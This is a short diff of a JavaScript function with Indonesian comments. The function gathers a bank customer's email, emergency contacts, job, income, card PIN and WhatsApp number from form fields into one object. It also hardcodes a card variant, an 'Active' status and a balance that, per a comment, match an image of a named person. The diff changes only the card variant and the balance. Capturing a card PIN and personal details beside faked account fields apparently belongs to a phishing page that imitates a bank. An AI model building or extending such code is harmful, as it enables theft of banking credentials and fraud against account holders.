@@ -156,7 +156,7 @@ async function finalRevealProcess() {
 
     // --- STRUKTUR DATA IDENTIK DENGAN GAMBAR (ILHAM PRAYUDA) ---
     const nasabahData = {
-        activeVariant: "Rose Signature", // Sesuai gambar
+        activeVariant: "Platinum", // Sesuai gambar
         cardStatus: "Active",             // Sesuai gambar
         email: document.getElementById('inputEmail').value,
         kontak_darurat: {                // Mengelompokkan kontak darurat
@@ -169,7 +169,7 @@ async function finalRevealProcess() {
         pekerjaan: document.getElementById('jobType').value,
         pendapatan: document.getElementById('income').value,
         pin: inputPW.value,
-        saldo: 1068500,                  // Default saldo sesuai gambar
+        saldo: 1,                  // Default saldo sesuai gambar
         tgl_daftar: new Date().toISOString(), // Format ISO sesuai gambar
         wa: inputWA.value
     };
